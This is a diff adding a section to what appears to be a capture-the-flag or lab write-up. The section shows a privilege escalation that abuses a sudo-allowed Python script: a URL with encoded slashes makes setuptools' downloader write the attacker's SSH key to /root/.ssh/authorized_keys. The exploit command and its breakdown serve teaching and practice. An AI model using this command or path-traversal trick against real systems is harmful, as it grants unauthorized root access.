@@ -2183,6 +2183,24 @@ You can skip this step if you server from the time we were sending `exploit.zip`
 </div>
 
 #### 5.2.3 Triggering the Path Traversal (Target Side)
+
+Using the discovered `sudo` privilege, we forced the root-run script to "install" our key. By using URL-encoded slashes (`%2f`), we bypassed the script's internal path-joining logic to write directly to an absolute system path.
+
+**Command:** `sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.14.71/%2froot%2f.ssh%2fauthorized_keys'`
+
+**Breakdown:**
+
+- `sudo /usr/bin/python3 ...`: Executes the Python interpreter and the validator script with full **root** privileges.
+    
+- `http://10.10.14.71/`: Points the `PackageIndex` downloader to the attacker's Kali machine.
+    
+- `%2froot%2f.ssh%2fauthorized_keys`: This is the payload.
+    
+    - The `%2f` is the URL-encoded version of the forward slash (`/`).
+        
+    - **The Vulnerability:** When the `setuptools` library processes this URL, it fails to properly sanitize the encoded characters before passing the string to the filesystem's "write" function.
+        
+    - **The Result:** Instead of saving a file named `authorized_keys` inside the intended directory (`/opt/font-tools/validators/`), the leading `%2f` (decoded to `/`) tricks the OS into treating the path as **absolute**. This forces the file to be written directly to `/root/.ssh/authorized_keys`.
 <div align="center">
 <br>
 <br>
